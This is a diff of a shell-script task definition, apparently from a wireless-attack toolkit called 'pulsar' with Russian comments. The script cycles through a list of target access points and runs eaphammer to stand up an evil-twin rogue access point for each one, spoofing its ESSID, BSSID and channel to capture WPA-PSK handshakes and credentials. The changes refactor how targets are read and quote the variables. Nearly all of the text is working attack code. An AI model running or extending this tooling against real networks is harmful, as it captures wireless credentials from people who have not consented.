@@ -4,8 +4,8 @@ description: |-
   ВНИМАНИЕ! Любое внешнее логирование судя по всему ломает eaphammer - и встроенные функции bshm, и tee... Мистика!
 tags:
   - wpa-psk
-  - evil twin
-  - handshake
+  - evil twin pulsar
+  - handshake capture
 
 arguments:
   ap-wlan:
@@ -49,7 +49,8 @@ script: |-
   iw dev $monitor info 2>&1 1>/dev/null || { echo "Device $monitor not found"; exit ; };
   filenotfound=false;
   for file in #list#; do test -e $file || { filenotfound=true; echo -e "\e[1;91m[error] File $file not exist\e[0m"; }; done;
-  if $filenotfound; then exit; fi
+  if $filenotfound; then exit; fi;
+  cat #list# | sort -u | sort -R > temp.etwin-targets.txt;
 
   # Функции
   stop_mon_screen() { sudo screen -S pulsar-monitor-proc -X stuff '^C'; };
@@ -57,7 +58,7 @@ script: |-
 
   mkdir -p $outdir;
   while true; do
-    for ap in $(cat #list# | sort -u | sort -R); do
+    while IFS= read -r ap; do
       # Параметры
       essid=$(echo $ap | awk -F ';' '{print $1}');
       bssid=$(echo $ap | awk -F ';' '{print $2}');
@@ -84,7 +85,7 @@ script: |-
       sudo iw $interface set type managed;
       sudo ip link set $interface up;
       sudo nmcli dev set $interface managed yes;
-      sudo timeout -s INT -k 20s #timeout# eaphammer --interface $interface --essid $essid --auth wpa-psk --password 00000000 --creds --psk-capture-file $aphsfile --bssid $bssid --channel $channel;
+      sudo timeout -s INT -k 20s #timeout# eaphammer --interface "$interface" --essid "$essid" --auth wpa-psk --password 00000000 --creds --psk-capture-file "$aphsfile" --bssid "$bssid" --channel "$channel";
       
       # Выход
       stop_mon_screen; sleep 1;
@@ -94,6 +95,7 @@ script: |-
       for i in 5 4 3 2 1; do echo -n "$i... "; sleep 1; done; 
       sudo screen -XS pulsar-monitor-proc quit >/dev/null;
       echo; 
-    done;
-  done
+    done < temp.etwin-targets.txt;
+  done;
+  rm -f ./temp.etwin-targets.txt
   
